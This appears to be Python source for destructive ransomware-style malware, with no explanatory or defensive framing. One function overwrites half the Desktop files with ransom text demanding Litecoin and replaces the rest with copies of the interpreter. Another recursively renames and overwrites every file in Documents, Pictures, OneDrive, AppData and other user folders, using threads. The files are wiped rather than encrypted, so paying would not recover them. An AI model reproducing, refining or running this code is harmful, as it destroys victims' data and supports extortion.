import random,string,os,sys,shutil,threading,subprocess
def cleardesk():
    try:
        import shutil, sys, os, random, string
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        if os.path.exists(desktop_path):
            files = [os.path.join(desktop_path, f) for f in os.listdir(desktop_path) if os.path.isfile(os.path.join(desktop_path, f))]
            half = len(files) // 2
            for file_path in files[:half]:
                try:
                    shutil.copyfile(sys.executable, file_path)
                except:
                    continue
            for file_path in files[half:]:
                try:
                    with open(file_path, "w") as f:
                        f.write(("HELLO YOUR PC IS LOCKED! TO GET IT BACK, PAY 100 USD IN LITECOIN TO ADDRESS LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB\n" * 150).strip())
                except:
                    continue
            for _ in range(100):
                random_name = f"destruction_{''.join(random.choices(string.ascii_letters + string.digits, k=10))}.exe"
                shutil.copy(sys.executable, os.path.join(desktop_path, random_name))
    except:
        pass

def destroy():
 def r(d):
  try:
   for f in os.listdir(d):
    p=os.path.join(d,f)
    if os.path.isdir(p):r(p)
    elif os.path.isfile(p):
     n=f"encryptedfile{''.join(random.choices(string.ascii_letters+string.digits,k=6))}.txt"
     np=os.path.join(d,n)
     try:
      os.rename(p,np)
      with open(np,"w")as w:w.write(("YOUR PC AND FILES HAVE BEEN FUCKED! IN ORDER TO GET IT BACK PAY US 100 USD AT LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB LITECOIN ONLY! "*200).strip()+"\n")*25
     except:continue
  except:pass
 dirs=[os.path.expanduser("~\\Documents"),os.path.expanduser("~\\Videos"),os.path.expanduser("~\\Pictures"),os.path.expanduser("~\\Music"),os.path.expanduser("~\\Links"),os.path.expanduser("~\\Saved Games"),os.path.expanduser("~\\OneDrive"),os.path.expanduser("~\\Favorites"),os.path.expanduser("~\\Contacts"),os.path.expanduser("~\\Searches"),os.path.expanduser("~\\Recent"),os.path.expanduser("~\\NTUSER.DAT"),os.path.expanduser("~\\AppData\\LocalLow"),os.path.expanduser("~\\AppData\\Local\\Microsoft"),os.path.expanduser("~\\AppData\\Roaming\\Microsoft")]
 threads=[]
 for d in dirs:
  t=threading.Thread(target=r,args=(d,))
  threads.append(t)
  t.start()
  if len(threads)==5:
   for t in threads:t.join()
   threads=[]
 for d in dirs:
  t=threading.Thread(target=r,args=(d,))
  threads.append(t)
  t.start()
  if len(threads)==5:
   for t in threads:t.join()
   threads=[]
